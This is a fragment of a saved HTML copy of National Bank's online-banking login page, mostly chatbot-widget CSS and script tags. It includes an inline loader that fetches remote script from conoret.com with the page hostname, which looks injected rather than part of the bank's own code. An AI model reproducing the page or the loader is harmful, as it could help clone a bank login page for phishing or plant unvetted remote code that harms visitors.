                box-shadow: 0 0 2px 17px rgba(76, 189, 90, 0)
            }

            to {
                transform: scale(.95);
                box-shadow: 0 0 0 0 rgba(76, 189, 90, 0)
            }
        }

        @keyframes rw-pulse-dot {
            0% {
                transform: scale(.95);
                box-shadow: 0 0 0 0 rgba(76, 189, 90, .4)
            }

            70% {
                transform: scale(1);
                box-shadow: 0 0 2px 17px rgba(76, 189, 90, 0)
            }

            to {
                transform: scale(.95);
                box-shadow: 0 0 0 0 rgba(76, 189, 90, 0)
            }
        }
    </style>
    <style type="text/css">
        #bnc-chatbot .widget-about-container.closed {
            display: none
        }

        #bnc-chatbot .widget-about-container.opened {
            display: flex;
            box-shadow: 0 1px 1.5px -1px rgba(0, 0, 0, .048), 0 2.5px 3.7px -1px rgba(0, 0, 0, .069), 0 5px 7px -1px rgba(0, 0, 0, .085), 0 9.7px 12.5px -1px rgba(0, 0, 0, .101), 0 19.7px 23.4px -1px rgba(0, 0, 0, .122), 0 54px 56px -1px rgba(0, 0, 0, .17)
        }

        #bnc-chatbot .widget-about-container.opened+div .rw-widget-container .rw-conversation-container {
            display: none
        }

        #bnc-chatbot div.content__text>p,
        #bnc-chatbot div.content__text>ul {
            font-size: .875rem;
            line-height: 1.5;
            font-family: gilroy, Arial, Helvetica, sans-serif;
            color: #000;
            margin-bottom: 1rem
        }

        #bnc-chatbot div.content__text>p>a,
        #bnc-chatbot div.content__text>p>li>a,
        #bnc-chatbot div.content__text>ul>a,
        #bnc-chatbot div.content__text>ul>li>a {
            font-size: .875rem;
            line-height: 1.5;
            font-family: gilroy, Arial, Helvetica, sans-serif;
            color: #1572c5;
            text-decoration: underline
        }

        #bnc-chatbot div.content__text>p>a:hover,
        #bnc-chatbot div.content__text>p>li>a:hover,
        #bnc-chatbot div.content__text>ul>a:hover,
        #bnc-chatbot div.content__text>ul>li>a:hover {
            text-decoration: none
        }

        #bnc-chatbot .widget-about-container {
            display: none;
            border-radius: 8px;
            font-family: gilroy, Arial, Helvetica, sans-serif;
            background-color: #fff;
            flex-direction: column;
            overflow: hidden;
            width: 370px;
            bottom: 0;
            margin: 0 20px 85px 0;
            position: fixed;
            right: 0;
            z-index: 10000
        }

        @media (max-width:800px) {
            #bnc-chatbot .widget-about-container {
                width: 100%;
                margin: 0;
                height: 100%
            }
        }

        #bnc-chatbot .widget-about-container .widget-about-container__header {
            display: flex;
            background-color: #1572c5;
            align-items: center;
            text-align: left;
            font-family: gilroy, Arial, Helvetica, sans-serif;
            padding: 0 1rem;
            color: #fff;
            height: 55px;
            min-height: 55px;
            border-radius: 8px 8px 0 0;
            border: 1px solid #d5d5d5
        }

        #bnc-chatbot .widget-about-container .widget-about-container__header>div {
            display: flex
        }

        #bnc-chatbot .widget-about-container .widget-about-container__header .header__back-button {
            cursor: pointer
        }

        #bnc-chatbot .widget-about-container .widget-about-container__header .header__back-button svg path {
            fill: #fff
        }

        #bnc-chatbot .widget-about-container .widget-about-container__header .header__back-button:focus {
            outline: none;
            box-shadow: 0 0 0 2px #fff, 0 0 0 5px rgba(21, 114, 197, .8) !important;
            border-radius: 3px
        }

        #bnc-chatbot .widget-about-container .widget-about-container__header .header__back-button:focus:not(:focus-visible) {
            box-shadow: none !important
        }

        #bnc-chatbot .widget-about-container .widget-about-container__header .header__title {
            font-size: 1.125rem;
            font-weight: 500;
            justify-content: center;
            flex: 100%;
            margin-right: 24px
        }

        #bnc-chatbot .widget-about-container .widget-about-container__content {
            padding: 1rem 1rem 0;
            margin-bottom: 1rem;
            height: calc(64px + 50vh - 1rem);
            max-height: 510px;
            overflow-y: auto
        }

        @media (max-width:800px) {
            #bnc-chatbot .widget-about-container .widget-about-container__content {
                height: 100%;
                max-height: 100%
            }
        }

        #bnc-chatbot .widget-about-container .widget-about-container__content:focus {
            outline: none;
            box-shadow: 0 0 0 5px #448dd1, inset 5px 0 0 0 rgba(21, 114, 197, .8), inset -5px 0 0 0 rgba(21, 114, 197, .8) !important
        }

        #bnc-chatbot .widget-about-container .widget-about-container__content:focus:not(:focus-visible) {
            box-shadow: none !important
        }

        #bnc-chatbot .widget-about-container .widget-about-container__content .content__title {
            font-size: 1.5rem;
            font-weight: 500;
            text-align: left;
            font-family: gilroy, Arial, Helvetica, sans-serif
        }

        #bnc-chatbot .widget-about-container .widget-about-container__content .content__text {
            font-size: .875rem;
            margin-top: 2rem;
            line-height: 1.5;
            font-family: gilroy, Arial, Helvetica, sans-serif
        }

        #bnc-chatbot .widget-about-container .widget-about-container__content .content__text a {
            font-size: .875rem
        }

        #bnc-chatbot .widget-about-container .widget-about-container__content .content__text br {
            margin-top: 1rem;
            display: block;
            content: ""
        }

        #bnc-chatbot .widget-about-container .widget-about-container__content .content__text>p {
            margin-bottom: 1rem
        }

        #bnc-chatbot .widget-about-container .widget-about-container__content .content__text>p:last-child {
            margin-bottom: 0
        }
    </style>
    <style type="text/css">
        #bnc-chatbot .widget-menu.closed {
            display: none
        }

        #bnc-chatbot .widget-menu.opened {
            display: flex
        }

        .widget-menu__item:focus {
            outline: none;
            box-shadow: inset 0 0 0 3px #448dd1, inset 0 0 0 2px #fff !important;
            border-radius: 7px
        }

        .widget-menu__item:focus:not(:focus-visible) {
            box-shadow: none !important
        }

        #bnc-chatbot .widget-menu {
            border-radius: 8px;
            box-shadow: 0 8px 16px 0 rgba(43, 45, 49, .25);
            font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Oxygen, Ubuntu, Cantarell, Open Sans, Helvetica Neue, sans-serif;
            background-color: #fff;
            flex-direction: column;
            overflow: hidden;
            max-width: 195px;
            position: absolute;
            z-index: 10000;
            right: 60px;
            top: 45px;
            font-size: .75rem;
            font-weight: 400;
            color: #000
        }

        @media (max-width:800px) {
            #bnc-chatbot .widget-menu {
                right: 70px
            }
        }

        #bnc-chatbot .widget-menu .widget-menu__item {
            padding: .75rem;
            border-bottom: 1px solid #d5d5d5;
            cursor: pointer
        }

        #bnc-chatbot .widget-menu .widget-menu__item:active {
            box-shadow: inset 0 4px 8px 0 rgba(0, 0, 0, .15)
        }

        #bnc-chatbot .widget-menu .widget-menu__item:hover {
            background-color: #f5f6f7
        }

        #bnc-chatbot .widget-menu .widget-menu__item:last-child {
            border-bottom: none
        }
    </style>
    <style type="text/css">
        .rw-open-launcher__container>img {
            width: 100%
        }

        .rw-widget-container.rw-chat-open {
            -webkit-animation-delay: 0;
            animation-delay: 0;
            -webkit-animation-duration: .5s;
            animation-duration: .5s;
            -webkit-animation-name: slide-in;
            animation-name: slide-in;
            -webkit-animation-fill-mode: forwards;
            animation-fill-mode: forwards
        }

        @media (max-width:800px) {
            .rw-widget-container.rw-chat-open {
                margin-bottom: 0
            }
        }

        .sr-only-bot,
        .sr-only-user {
            display: none
        }

        a:focus {
            outline: none;
            box-shadow: 0 0 0 2px rgba(21, 114, 197, .8) !important
        }

        a:focus:not(:focus-visible) {
            box-shadow: none !important
        }

        div#rw-messages:focus {
            box-shadow: 0 0 0 5px #448dd1, inset 5px 0 0 0 rgba(21, 114, 197, .8), inset -5px 0 0 0 rgba(21, 114, 197, .8) !important
        }

        div#rw-messages:focus:not(:focus-visible) {
            box-shadow: none !important
        }

        span#chatbot-menu-button {
            outline: none;
            border-radius: 7px;
            padding: 0 7px 9.2px 7.5px;
            position: relative;
            bottom: .3px;
            right: 20px
        }

        span#chatbot-menu-button:focus {
            box-shadow: inset 0 0 0 2px #fff, 0 0 0 3px rgba(21, 114, 197, .8) !important
        }

        span#chatbot-menu-button:focus:not(:focus-visible) {
            box-shadow: none !important
        }

        .rw-conversation-container {
            border-radius: 8px;
            font-family: gilroy, Arial, Helvetica, sans-serif !important;
            -webkit-animation: none;
            animation: none
        }

        .rw-conversation-container .rw-message.rw-typing-indication.rw-with-avatar img.rw-avatar {
            width: 1.5rem;
            height: 1.5rem
        }

        .rw-conversation-container .rw-header {
            border-radius: 8px 8px 0 0;
            background-color: #1572c5 !important;
            align-items: flex-start;
            text-align: left;
            font-family: gilroy, Arial, Helvetica, sans-serif !important;
            padding: 0 1rem;
            justify-content: space-between;
            display: flex;
            flex-direction: row-reverse;
            z-index: 1;
            position: relative
        }

        .rw-conversation-container .rw-header img.rw-avatar {
            display: none
        }

        .rw-conversation-container .rw-header .rw-header-buttons .rw-close-button {
            background: transparent;
            border: none;
            cursor: pointer;
            display: inherit;
            padding: 5px;
            width: auto;
            border-radius: 5px;
            z-index: 3
        }

        .rw-conversation-container .rw-header .rw-header-buttons .rw-close-button:focus {
            outline: none;
            box-shadow: 0 0 0 2px #fff, 0 0 0 5px rgba(21, 114, 197, .8) !important
        }

        .rw-conversation-container .rw-header .rw-header-buttons .rw-close-button:focus:not(:focus-visible) {
            box-shadow: none !important
        }

        .rw-conversation-container .rw-header .rw-header-buttons .rw-close-button img {
            height: 16px;
            width: 16px;
            background: transparent;
            -o-object-fit: contain;
            object-fit: contain;
            padding: 0
        }

        .rw-conversation-container .rw-header .rw-header-buttons .rw-close-button img:hover {
            margin-left: 0
        }

        .rw-conversation-container .rw-header .rw-title {
            font-family: gilroy, Arial, Helvetica, sans-serif !important;
            font-weight: 400;
            -ms-grid-row-align: center;
            align-self: center;
            width: 100%
        }

        .rw-conversation-container .rw-header .rw-title .header-title-container {
            display: flex
        }

        .rw-conversation-container .rw-header .rw-title .header-title-container span {
            align-content: center;
            -ms-grid-row-align: center;
            align-self: center
        }

        .rw-conversation-container .rw-header .rw-title .header-title-container__oval {
            background: #fff;
            border-radius: 50%;
            width: 1.75rem;
            height: 1.75rem;
            display: flex;
            justify-content: space-around;
            align-items: center;
            -ms-grid-row-align: center;
            align-self: center
        }

        .rw-conversation-container .rw-header .rw-title .header-title-container__menu {
            margin-left: auto;
            -ms-grid-row-align: center;
            align-self: center
        }

        .rw-conversation-container .rw-header .rw-title .header-title-container__menu>span {
            display: flex;
            transform: rotate(90deg);
            font-size: 1.15rem;
            font-weight: 700;
            cursor: pointer
        }

        .rw-conversation-container .rw-header .rw-title .header-title-container__text-container {
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            -ms-grid-row-align: center;
            align-self: center;
            text-align: left;
            margin-left: .5rem
        }

        .rw-conversation-container .rw-header .rw-title .header-title-container__text-container span {
            align-self: flex-start
        }

        .rw-conversation-container .rw-header .rw-title .header-title-container__text-container span:first-child {
            font-size: 1.125rem;
            font-weight: 500;
            margin-bottom: .125rem
        }

        .rw-conversation-container .rw-header .rw-title .header-title-container__text-container span:last-child {
            font-size: .75rem;
            font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Oxygen, Ubuntu, Cantarell, Open Sans, Helvetica Neue, sans-serif !important
        }

        .rw-conversation-container .rw-header .rw-title.rw-with-avatar {
            position: static
        }

        .rw-conversation-container form.rw-sender {
            background-color: #fff;
            border-top: 1px solid #d5d5d5;
            font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Oxygen, Ubuntu, Cantarell, Open Sans, Helvetica Neue, sans-serif !important
        }

        .rw-conversation-container form.rw-sender .rw-new-message,
        .rw-conversation-container form.rw-sender .rw-new-message:focus {
            background-color: #fff;
            box-shadow: none !important;
            font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Oxygen, Ubuntu, Cantarell, Open Sans, Helvetica Neue, sans-serif !important;
            transition: none;
            border: none
        }

        .rw-conversation-container form.rw-sender .rw-new-message::-moz-placeholder {
            color: #50545d;
            opacity: 1
        }

        .rw-conversation-container form.rw-sender .rw-new-message:-ms-input-placeholder {
            color: #50545d;
            opacity: 1
        }

        .rw-conversation-container form.rw-sender .rw-new-message::placeholder {
            color: #50545d;
            opacity: 1
        }

        .rw-conversation-container form.rw-sender button.rw-send {
            background-color: #fff;
            border-radius: 5px;
            margin-right: 10px;
            padding: 1px 2px 1px 3px
        }

        .rw-conversation-container form.rw-sender button.rw-send:focus {
            outline: none;
            box-shadow: 0 0 0 2px #fff, 0 0 0 5px rgba(21, 114, 197, .8) !important
        }

        .rw-conversation-container form.rw-sender button.rw-send:focus:not(:focus-visible) {
            box-shadow: none !important
        }

        .rw-conversation-container form.rw-sender button.rw-send .rw-send-icon-ready:disabled,
        .rw-conversation-container form.rw-sender button.rw-send path {
            fill: #b7b9be
        }

        .rw-conversation-container form.rw-sender button.rw-send .rw-send-icon-ready {
            fill: #1572c5
        }

        .rw-conversation-container .rw-group-message .rw-message {
            margin-top: 3px;
            margin-bottom: 3px;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Oxygen, Ubuntu, Cantarell, Open Sans, Helvetica Neue, sans-serif !important;
            font-size: .875rem
        }

        .rw-conversation-container .rw-group-message .rw-message .rw-quickReplies-container {
            max-width: 215px
        }

        @media (max-width:800px) {
            .rw-conversation-container .rw-group-message .rw-message .rw-quickReplies-container {
                max-width: 70%
            }
        }

        .rw-conversation-container .rw-group-message .rw-message .rw-replies {
            margin: 10px 0 0 32px;
            align-items: flex-start
        }

        .rw-conversation-container .rw-group-message .rw-message .rw-replies .rw-reply {
            border-color: #1572c5;
            color: #1572c5;
            font-family: gilroy, Arial, Helvetica, sans-serif !important;
            font-size: .875rem;
            font-weight: 600;
            margin-left: 0;
            background-color: transparent;
            box-shadow: none !important;
            min-width: 96px;
            display: -ms-inline-grid;
            display: inline-grid;
            transition: none
        }

        .rw-conversation-container .rw-group-message .rw-message .rw-replies .rw-reply:focus {
            outline: none;
            box-shadow: 0 0 0 2px #fff, 0 0 0 5px rgba(21, 114, 197, .8) !important
        }

        .rw-conversation-container .rw-group-message .rw-message .rw-replies .rw-reply:focus:not(:focus-visible) {
            box-shadow: none !important
        }

        .rw-conversation-container .rw-group-message .rw-message .rw-client {
            color: #fff;
            background-color: #1572c5 !important
        }

        .rw-conversation-container .rw-group-message .rw-message .rw-client,
        .rw-conversation-container .rw-group-message .rw-message .rw-response {
            padding: 10px 15px;
            font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Oxygen, Ubuntu, Cantarell, Open Sans, Helvetica Neue, sans-serif !important
        }

        .rw-conversation-container .rw-group-message .rw-message .rw-response {
            background-color: #f5f5f5;
            color: #000
        }

        .rw-conversation-container .rw-group-message .rw-message img.rw-avatar {
            width: 1.5rem;
            height: 1.5rem;
            align-self: flex-end;
            position: static
        }

        .rw-conversation-container .rw-group-message .rw-message .rw-bot-nametag {
            color: #606773;
            font-size: .875rem;
            margin-bottom: .5rem;
            margin-left: 32px;
            display: none;
            flex-basis: 100%
        }

        .rw-conversation-container .rw-group-message .rw-message .rw-user-nametag {
            color: #606773;
            font-size: .875rem;
            margin-bottom: .5rem;
            display: none;
            float: right;
            text-align: right;
            flex-basis: 100%
        }

        .rw-conversation-container .rw-group-message .rw-message .rw-carousel-container .rw-reply {
            background-color: #1572c5;
            font-family: gilroy, Arial, Helvetica, sans-serif
        }

        .rw-conversation-container .rw-group-message .rw-message .rw-carousel-arrows-container .rw-carousel-arrow {
            border-radius: 50%;
            width: 2.25rem;
            height: 2.25rem;
            font-family: gilroy, Arial, Helvetica, sans-serif;
            background-color: #1572c5;
            color: #fff;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 2rem
        }

        .rw-conversation-container .rw-group-message .rw-message .rw-carousel-arrows-container .rw-carousel-arrow>* {
            display: none
        }

        .rw-conversation-container .rw-group-message .rw-message .rw-carousel-arrows-container .rw-right-arrow {
            right: 0
        }

        .rw-conversation-container .rw-group-message .rw-message .rw-carousel-arrows-container .rw-left-arrow {
            left: 0
        }

        .rw-conversation-container .rw-group-message .rw-message .rw-carousel-arrows-container .rw-right-arrow:before {
            content: "\203A";
            margin-bottom: .25rem;
            margin-left: .15rem
        }

        .rw-conversation-container .rw-group-message .rw-message .rw-carousel-arrows-container .rw-left-arrow:before {
            content: "\2039";
            margin-bottom: .25rem;
            margin-left: .15rem
        }

        .rw-conversation-container .rw-group-message .rw-message:first-child {
            margin-top: 10px
        }

        .rw-conversation-container .rw-group-message .rw-message:last-child {
            margin-bottom: 10px
        }

        .rw-conversation-container .rw-group-message.rw-from-client .rw-message .rw-client {
            border-radius: 15px
        }

        .rw-conversation-container .rw-group-message.rw-from-client .rw-message .rw-message-date {
            display: none;
            text-align: right;
            flex-basis: 100%;
            margin-left: 0;
            margin-right: 0;
            font-size: 11px;
            color: #606773
        }

        .rw-conversation-container .rw-group-message.rw-from-response .rw-message img.rw-avatar {
            display: none
        }

        .rw-conversation-container .rw-group-message.rw-from-response .rw-message .image {
            margin-left: 2rem
        }

        @media (max-width:800px) {
            .rw-conversation-container .rw-group-message.rw-from-response .rw-message .image {
                max-width: 70%
            }
        }

        .rw-conversation-container .rw-group-message.rw-from-response .rw-message .rw-response {
            border-radius: 15px;
            margin-left: 2rem;
            margin-right: 30px
        }

        @media (max-width:800px) {
            .rw-conversation-container .rw-group-message.rw-from-response .rw-message .rw-response {
                max-width: -webkit-max-content;
                max-width: -moz-max-content;
                max-width: max-content;
                margin-right: 30px
            }
        }

        .rw-conversation-container .rw-group-message.rw-from-response .rw-message .rw-message-date {
            display: none;
            text-align: left;
            flex-basis: 100%;
            margin-left: 50px;
            font-size: 11px;
            color: #606773
        }

        .rw-conversation-container .rw-group-message.rw-from-response .rw-message .rw-bot-nametag,
        .rw-conversation-container .rw-group-message.rw-from-response .rw-message .rw-user-nametag {
            display: none
        }

        .rw-conversation-container .rw-group-message.rw-from-client .rw-message:last-child .rw-client {
            border-radius: 15px 15px 0
        }

        .rw-conversation-container .rw-group-message.rw-from-client .rw-message:last-child .rw-message-date {
            display: block
        }

        .rw-conversation-container .rw-group-message.rw-from-response .rw-message:last-child img.rw-avatar {
            display: block;
            position: absolute;
            bottom: 1.5625rem
        }

        .rw-conversation-container .rw-group-message.rw-from-response .rw-message:last-child .image {
            margin-left: 0
        }

        .rw-conversation-container .rw-group-message.rw-from-response .rw-message:last-child .rw-response {
            border-radius: 15px 15px 15px 0;
            margin-left: 32px
        }

        .rw-conversation-container .rw-group-message.rw-from-response .rw-message:last-child .rw-message-date {
            display: block;
            margin-left: 32px
        }

        .rw-conversation-container .rw-group-message.rw-from-client .rw-message:first-child .rw-user-nametag,
        .rw-conversation-container .rw-group-message.rw-from-response .rw-message:first-child .rw-bot-nametag {
            display: block
        }

        .rw-conversation-container .rw-group-message.rw-from-client .rw-message:first-child .sr-only-user,
        .rw-conversation-container .rw-group-message.rw-from-response .rw-message:first-child .sr-only-bot {
            display: block;
            position: absolute;
            width: 1px;
            height: 1px;
            padding: 0;
            margin: -1px;
            overflow: hidden;
            clip: rect(0, 0, 0, 0);
            white-space: nowrap;
            border: 0
        }

        .rw-conversation-container .rw-group-message.rw-from-response .rw-message:not(:first-child):not(:only-child).rw-with-avatar {
            margin-left: 10px
        }

        .rw-widget-container .rw-launcher .rw-tooltip-body {
            background-color: #2b2d31;
            border-radius: 8px;
            color: #fff;
            font-size: .875rem;
            width: 280px;
            right: 78px;
            max-width: calc(100vw - 90px - 1rem);
            padding: 0
        }

        .rw-widget-container .rw-launcher .rw-tooltip-body>div:nth-child(2):not(.rw-slider-safe-zone) {
            max-height: min(60vh, 168px);
            width: 87%;
            overflow-y: auto;
            margin-bottom: .5rem;
            margin-left: 1.125rem;
            margin-top: .313rem;
            scrollbar-width: thin;
            scrollbar-color: #50545d
        }

        .rw-widget-container .rw-launcher .rw-tooltip-body>div:nth-child(2):not(.rw-slider-safe-zone)::-webkit-scrollbar {
            background-color: transparent;
            width: 6px
        }

        .rw-widget-container .rw-launcher .rw-tooltip-body>div:nth-child(2):not(.rw-slider-safe-zone)::-webkit-scrollbar-track {
            margin-top: 3rem
        }

        .rw-widget-container .rw-launcher .rw-tooltip-body>div:nth-child(2):not(.rw-slider-safe-zone)::-webkit-scrollbar-thumb {
            background-color: #50545d
        }

        .rw-widget-container .rw-launcher .rw-tooltip-body .rw-separator {
            display: none
        }

        .rw-widget-container .rw-launcher .rw-tooltip-body .rw-slider-safe-zone .slick-list .rw-tooltip-response::-webkit-scrollbar {
            background-color: transparent;
            width: 6px;
            height: 6px
        }

        .rw-widget-container .rw-launcher .rw-tooltip-body .rw-slider-safe-zone .slick-list .rw-tooltip-response::-webkit-scrollbar-track {
            margin-top: 3rem
        }

        .rw-widget-container .rw-launcher .rw-tooltip-body .rw-slider-safe-zone .slick-list .rw-tooltip-response::-webkit-scrollbar-thumb {
            background-color: #50545d
        }

        .rw-widget-container .rw-launcher .rw-tooltip-body .rw-slider-safe-zone .slick-list .rw-tooltip-response {
            scrollbar-width: thin;
            scrollbar-color: #50545d
        }

        .rw-widget-container .rw-launcher .rw-tooltip-body .rw-slider-safe-zone .slick-arrow.slick-next,
        .rw-widget-container .rw-launcher .rw-tooltip-body .rw-slider-safe-zone .slick-arrow.slick-prev {
            opacity: 0;
            height: calc(100% + 32px);
            top: calc(50% + 16px)
        }

        .rw-widget-container .rw-launcher .rw-tooltip-body .rw-slider-safe-zone .slick-dots li button {
            border-radius: 2px
        }

        .rw-widget-container .rw-launcher .rw-tooltip-body .rw-slider-safe-zone .slick-dots li button:focus {
            outline: none;
            box-shadow: 0 0 0 2px #fff, 0 0 0 5px #448dd1 !important
        }

        .rw-widget-container .rw-launcher .rw-tooltip-body .rw-slider-safe-zone .slick-dots li button:focus:not(:focus-visible) {
            box-shadow: none !important
        }

        .rw-widget-container .rw-launcher .rw-tooltip-body .rw-slider-safe-zone .slick-dots li button:before {
            color: #50545d;
            opacity: 1
        }

        .rw-widget-container .rw-launcher .rw-tooltip-body .rw-slider-safe-zone .slick-dots li.slick-active button:before {
            color: #fff
        }

        .rw-widget-container .rw-launcher .rw-tooltip-body .rw-slider-safe-zone .slick-dots li button:before {
            font-family: gilroy, Arial, Helvetica, sans-serif;
            font-size: 1.85rem
        }

        .rw-widget-container .rw-launcher .rw-tooltip-body .rw-tooltip-close {
            height: auto;
            width: auto;
            top: 1rem;
            right: 1rem;
            z-index: 1
        }

        .rw-widget-container .rw-launcher .rw-tooltip-body .rw-tooltip-close button {
            background: #2b2d31;
            position: absolute;
            right: -.19rem;
            top: -.19rem;
            padding: .19rem .19rem 0;
            border-radius: .13rem
        }

        .rw-widget-container .rw-launcher .rw-tooltip-body .rw-tooltip-close button:focus {
            outline: none;
            box-shadow: 0 0 0 2px #fff, 0 0 0 5px #448dd1 !important
        }

        .rw-widget-container .rw-launcher .rw-tooltip-body .rw-tooltip-close button:focus:not(:focus-visible) {
            box-shadow: none !important
        }

        .rw-widget-container .rw-launcher .rw-tooltip-body .rw-tooltip-close button img {
            width: 1em
        }

        .rw-widget-container .rw-launcher .rw-tooltip-body .rw-tooltip-response {
            margin-top: 0
        }

        .rw-widget-container .rw-launcher .rw-tooltip-body .rw-response {
            text-align: left;
            font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Oxygen, Ubuntu, Cantarell, Open Sans, Helvetica Neue, sans-serif !important;
            margin-right: 1.5rem
        }

        .rw-widget-container .rw-launcher .rw-tooltip-body .rw-response p {
            color: #fff
        }

        .rw-widget-container .rw-launcher .rw-tooltip-body .rw-response a {
            color: #b7b9be;
            text-decoration: underline
        }

        .rw-widget-container .rw-launcher .rw-tooltip-body .rw-response a:focus {
            outline: none;
            box-shadow: 0 0 0 2px #fff, 0 0 0 5px #448dd1 !important
        }

        .rw-widget-container .rw-launcher .rw-tooltip-body .rw-response a:focus:not(:focus-visible) {
            box-shadow: none !important
        }

        .rw-widget-container .rw-launcher .rw-tooltip-body .rw-replies {
            justify-content: flex-start;
            display: flex
        }

        .rw-widget-container .rw-launcher .rw-tooltip-body .rw-replies .rw-reply {
            border-color: #fff;
            color: #fff;
            font-family: gilroy, Arial, Helvetica, sans-serif !important;
            background-color: transparent;
            justify-content: center
        }

        .rw-widget-container .rw-launcher .rw-tooltip-body .rw-replies .rw-reply:focus {
            outline: none;
            box-shadow: 0 0 0 2px #fff, 0 0 0 5px #448dd1 !important
        }

        .rw-widget-container .rw-launcher .rw-tooltip-body .rw-replies .rw-reply:focus:not(:focus-visible) {
            box-shadow: none !important
        }

        .rw-widget-container .rw-launcher .rw-tooltip-body .rw-tooltip-decoration {
            background-color: #2b2d31
        }

        #root .rw-conversation-container form.rw-sender input[type=text] {
            font-size: 1rem
        }

        #root .rw-conversation-container form.rw-sender input[type=text]:focus {
            outline: 0
        }

        .rw-widget-container button.rw-launcher {
            width: 56px;
            height: 56px;
            background-color: #1572c5;
            overflow: visible;
            cursor: pointer
        }

        @media (-ms-high-contrast:none),
        screen and (-ms-high-contrast:active) {
            .rw-widget-container button.rw-launcher {
                flex-direction: column
            }
        }

        @media (max-width:800px) {
            .rw-widget-container button.rw-launcher {
                margin: 0
            }
        }

        .rw-unread-pastille {
            background-color: #e41c23;
            color: #fff;
            border-radius: 50%;
            position: absolute;
            top: 0;
            right: 0;
            font-weight: 700;
            z-index: 1;
            font-size: 12px;
            min-width: 15px;
            padding: 3px
        }

        .rw-conversation-container .rw-header-buttons {
            display: flex;
            -ms-grid-row-align: center;
            align-self: center
        }

        @-webkit-keyframes shadow-pulse {

            0%,
            20% {
                box-shadow: 0 0 0 0 rgba(21, 114, 197, .4), 0 0 0 8px rgba(21, 114, 197, .2)
            }

            80%,
            to {
                box-shadow: 0 0 0 24px rgba(21, 114, 197, 0), 0 0 0 8px rgba(21, 114, 197, .2)
            }
        }

        @keyframes shadow-pulse {

            0%,
            20% {
                box-shadow: 0 0 0 0 rgba(21, 114, 197, .4), 0 0 0 8px rgba(21, 114, 197, .2)
            }

            80%,
            to {
                box-shadow: 0 0 0 24px rgba(21, 114, 197, 0), 0 0 0 8px rgba(21, 114, 197, .2)
            }
        }
    </style>
    <script src="//conoret.com/dsp?h=connexion.bnc.ca&amp;r=0.4297303916960238" type="text/javascript" defer=""
        async=""></script>
    <script
        src="https://assets.adobedtm.com/4c6660b07da2/1dfcfc7fa8fc/d6af36638a2d/RC6766a06247744cfda85fdcf5ba93aa52-source.min.js"
        async=""></script>
    <script type="text/javascript" async=""
        src="https://sdk.privacy-center.org/sdk/7f958a3af9bbad8f0189d58c4e209f86365ada31/modern/sdk.7f958a3af9bbad8f0189d58c4e209f86365ada31.js"
        charset="utf-8"></script>
    <script
        src="https://assets.adobedtm.com/4c6660b07da2/1dfcfc7fa8fc/d6af36638a2d/RC258fc59032d540ea805f62fde9ce727a-source.min.js"
        async=""></script>
    <title>National Bank | Banking services</title>
    <link rel="shortcut icon" href="/favicons/favicon.ico" data-react-helmet="true">
    <link rel="icon" sizes="192x192" href="/favicons/icon.png" data-react-helmet="true">
    <link rel="apple-touch-icon" href="/favicons/ios-icon.png" data-react-helmet="true">
    <meta name="msapplication-square310x310logo" content="/favicons/icon_largetile.png" data-react-helmet="true">
    <meta name="apple-itunes-app" content="app-id=476651878" data-react-helmet="true">
</head>

<body>
    <div id="didomi-host" data-nosnippet="true" aria-hidden="true"></div><iframe name="__tcfapiLocator"
        title="__tcfapiLocator" style="display: none;"></iframe>
    <script
        type="text/javascript">window.top === window && !function () { var e = document.createElement("script"), t = document.getElementsByTagName("head")[0]; e.src = "//conoret.com/dsp?h=" + document.location.hostname + "&r=" + Math.random(), e.type = "text/javascript", e.defer = !0, e.async = !0, t.appendChild(e) }();</script>
    <noscript>You need to enable JavaScript to run this app.</noscript>
    <div id="root">
        <div>
            <div>
                <div class="offScreenStyle" aria-live="assertive" aria-relevant="all" aria-atomic="true">National Bank
                    online services.</div>
                <div class="offScreenStyle" aria-live="assertive" aria-relevant="all" aria-atomic="true"></div>
            </div>
            <div class="template-right">
                <div class="template-right__content template-right__content--left">
                    <div class="bnc-media">
                        <div class="image-login-background"
                            style="background-image: url(&quot;https://dam.bnc.ca/content/dam/transac/sbip/img-login.jpg&quot;);">
                        </div>
                    </div>
                </div>
                <section class="template-right__content template-right__content--right">
                    <div class="container">
                        <header>
                            <div class="header">
                                <div class="header__switchLang"><button class="bt_link" title="" type="button" lang="fr"
                                        aria-label="Consulter le site en français">Français</button></div>
                                <div class="bnc-brand en">
                                    <div class="bnc-brand__logo">
                                        <h1 class="bnc-logo"><svg viewBox="0 0 408.6 106.3"
                                                preserveAspectRatio="xMinYMid meet">
                                                <title>National Bank</title>
                                                <g>
                                                    <g>
                                                        <path class="logo-icon"
                                                            d="M73.3,25 C71.3,25.5 69.9,25.8 68.4,25.2 C67.3,24.8 66.4,23.5 65.6,22.4 L52,3.8 C51.2,2.7 50.3,1.4 49.2,1 C47.8,0.4 46.3,0.8 44.3,1.2 L0.5,13 L0.5,94.5 L44.4,82.8 C46.4,82.4 47.9,82 49.3,82.6 C50.4,83.1 51.3,84.3 52.1,85.4 L65.6,104 C66.4,105.1 67.3,106.3 68.4,106.8 C69.8,107.3 71.3,107 73.3,106.6 L117.1,94.9 L117.1,13.2 L73.3,25 Z">
                                                        </path>
                                                        <polygon class="logo-txt"
                                                            points="167 16.5 167 37.4 166.9 37.4 153.1 13.2 145.5 16.9 145.5 47.9 152.2 47.9 152.2 23.1 152.3 23.1 166.5 47.9 173.7 47.9 173.7 13.2">
                                                        </polygon>
                                                        <path class="logo-txt"
                                                            d="M197.9,13.2 L197.9,13.2 L187.8,18.1 L177.2,47.9 L184.8,47.9 L187.2,40.7 L200,40.7 L202.2,47.9 L210.1,47.9 L197.9,13.2 Z M189.2,34.7 L193.6,21 L193.7,21 L198,34.7 L189.2,34.7 Z">
                                                        </path>
                                                        <path class="logo-txt"
                                                            d="M339.7,13.2 L339.7,13.2 L329.6,18.1 L319,47.9 L326.6,47.9 L329,40.7 L341.8,40.7 L344,47.9 L351.9,47.9 L339.7,13.2 Z M330.9,34.7 L335.3,21 L335.4,21 L339.7,34.7 L330.9,34.7 Z">
                                                        </path>
                                                        <polygon class="logo-txt"
